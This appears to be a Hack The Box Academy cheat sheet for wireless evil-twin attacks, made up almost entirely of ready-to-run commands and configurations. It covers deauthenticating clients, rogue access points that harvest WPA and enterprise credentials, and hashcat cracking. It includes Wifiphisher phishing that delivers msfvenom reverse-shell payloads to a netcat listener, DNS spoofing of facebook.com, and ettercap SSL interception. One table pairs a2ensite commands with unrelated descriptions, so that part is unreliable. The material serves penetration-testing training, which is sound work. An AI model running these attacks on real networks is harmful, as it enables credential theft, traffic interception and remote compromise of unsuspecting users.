### Enumeration

| Command | Description |
| --- | --- |
| sudo airmon-ng start wlan0 | Set the wlan0 interface to monitor mode |
| sudo airodump-ng wlan0mon | Scan for available networks |
| sudo airodump-ng wlan0mon -w HTB -c 1 | Scan for available networks on channel 1, and save network traffic to a file |
| sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon | Deauthenticating an access point. |
| sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon | Deauthenticating a specific client from an access point. |

### Deauthentication

| Command | Description |
| --- | --- |
| sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon | Deauthenticating an access point. |
| sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon | Deauthenticating a specific client from an access point. |

### Routing commands & configuration

**DNS Config (dns.conf)**

Code: configuration

```configuration
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
```

| Command | Description |
| --- | --- |
| sudo dnsmasq -C dns.conf -d | Launch the DNS/DHCP service with our conguration. |
| sudo ifconfig wlan1 192.168.0.1/24 | Configure valid IP address for the network interface to be used to host the rogue AP. |
| sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip\_forward' | Enable IP forwarding |
| sudo ifconfig wlan1 down | Shut down the wlan1 interface. |
| sudo macchanger -m D4:C1:8B:79:AD:44 wlan1 | Assign a spoofed MAC address to the wlan1 interface. |
| sudo ifconfig wlan1 up | Start the wlan1 interface. |
| sudo dnsspoof -i wlan1 | Redirect traffic from the victim to our attack host |
| sudo iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE | Enable NAT masquerading |
| sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT | Accept traffic from the wlan0 interface. |

### Password Cracking

| Command | Description |
| --- | --- |
| hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap | Converts a captured WPA handshake into a pcap. |
| hcxpcapngtool handshake.pcap -o hash.22000 | Converts the pcap to a Hashcat compatible hash format. |
| hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force | Cracking WPA/WPA2 hash. |
| hashcat -m 5500 -a 0 Administrator::::54as5<SNIP>5s5:as65a4sd564d1a2s wordlist.dict | Cracking NetNTLM hash. |

### Rogue Access Point Usage

| Command | Description |
| --- | --- |
| sudo hostapd hostapd.conf | Launching a wireless access point with `hostapd (Host Access Point Daemon)`. |
| sudo hostapd-mana hostapd.conf | Launching `hostapd-mana`, a modified version of hostapd optimized for rogue AP attacks and credential harvesting. |
| sudo hostapd-wp2 hostapd.conf | Launching `hostapd-wpe`, a modified version of hostapd designed to target WPA-2 Enterprise networks and EAP-based authentication methods. |

### Hostapd configurations (hostapd.conf)

**Open Network**

Code: configuration

```configuration
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
```

**Mana Loud**

Code: configuration

```configuration
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything

# Mana Configuration
enable_mana=1
mana_loud=1
```

**WPA2 Handshake Capture**

Code: configuration

```configuration
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=HackMe
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
```

**Enterprise Rogue AP**

Code: configuration

```configuration
# 802.11 Options
interface=wlan1
ssid=HTB-Wireless
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates

ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

# Hostapd-mana Edition
# Remove comments and reload to activate
#enable_mana=1
#mana_loud=1
#mana_credout=credentials.creds
#mana_eapsuccess=1
#mana_wpe=1
```

**EAP Method Negotiation \[hostapd.eap\_user\]**

Code: configuration

```configuration
* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]
```

---

# Automated Evil Twin Attacks

## Wifiphisher

| **Command** | **Description** |
| --- | --- |
| sudo systemctl restart NetworkManager | Ensures that WiFi interfaces are restored and ready, before initiating an attack. |
| wifiphisher --essid "FREE WI-FI" -p oauth-login -kB -kN | Launch the OAuth phishing attack. |
| wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN | Launch the firmware upgrade phishing attack. |
| msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf | Generates a malicious ELF file. |
| msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe | Generates a malicious Portable Executable. |
| wifiphisher -aI wlan0 -eI wlan1 -p plugin\_update --payload-path /home/wifi/shell.elf -kN | Launch the plugin update phishing attack. |
| nc -nvlp 4444 | Starts a netcat listener. |

### EAPHammer

| **Command** | **Description** |
| --- | --- |
| sudo /opt/eaphammer/eaphammer --cert-wizard | Creates self-signed certificates for the rogue AP. |
| sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Wireless --creds --negotiate balanced --essid-stripping '\\x20' | Launches the ESSID-stripped rogue AP |

**ESSID Stripping**

| Character | Description |
| --- | --- |
| `\x20` | Add a space, like a white space after ESSID |
| `\x00` | For NULL after ESSID, it'll omit all characters after it |
| `\t` | Add tab after ESSID |
| `\r` | Add new line after ESSID |
| `\n` | For a enter, similar to '\\r' after ESSID |

---

# MITM Attacks

## DNS Spoofing

| **Command** | **Description** |
| --- | --- |
| sudo wifipumpkin3 | Launch wifipumpkin3. |
| set interface wlan1 | Set the wireless interface for the AP. |
| set ssid HTB-Corp | Set the SSID for the AP. |
| set proxy noproxy | Disable the proxy. |
| ignore pydns\_server | Exclude the DNS server. |
| ap | View current settings configured for our rogue AP. |
| show | Display available modules in wifipumpkin3. |
| use spoof.dns\_spoof | Select the `dns_spoof` module. |
| set domains academy.hackthebox.com, <facebook.com> | Set the domain(s) to be spoofed. |
| set redirectTo 10.0.0.1 | Set the IP address that DNS requests will be redirected to. |
| start | Start the DNS spoof attack |
| back | Navigate out of the dns\_spoof configuration and back to the wifipumpkin3 console |
| start | Start the rogue AP. |
| start | Start the rogue AP. |
| sudo a2ensite intranet1.conf | Enable the first virtual host. |
| sudo a2ensite intranet2.conf | Enable the second virtual host. |
| sudo systemctl restart apache2 | Restart Apache web server. |
| sudo aireplay-ng --deauth 5 -a 9C:9A:03:39:BD:7A wlan0mon | If necessary, perform deauthentication attack to force victims to connect to the rogue AP. |

#### Virtual Host Configuration

**/etc/apache2/sites-available/intranet1.conf**

Code: configuration

```configuration
<VirtualHost *:80>
    ServerAdmin admin@hackthebox.com
    ServerName academy.hackthebox.com
    ServerAlias www.academy.hackthebox.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**/etc/apache2/sites-available/intranet2.conf**

Code: configuration

```configuration
<VirtualHost *:80>
    ServerAdmin admin@facebook.com
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /var/www/html/facebook
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

| **Command** | **Description** |
| --- | --- |
| sudo a2ensite intranet1.conf | View the basic help menu |
| sudo a2ensite intranet2.conf | View the advanced help menu |
| sudo systemctl restart apache2 | Run `SQLMap` without asking for user input |

## SSL Interception

#### Routing Configuration

**dns.conf**

Code: configuration

```configuration
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
```

**hostapd.conf**

Code: configuration

```configuration
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
```

| **Command** | **Description** |
| --- | --- |
| sudo ifconfig wlan1 192.168.0.1/24 | Configure the IP address for the interface that will host the fake access point. |
| sudo dnsmasq -c dns.conf -d | Start the DNS server. |
| sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip\_forward' | Enable IP forwarding. |
| sudo hostapd hostapd.conf | Start the access point. |
| ettercap -T -q -M ARP -i wlan1 | Initiate the SSL intercept attack |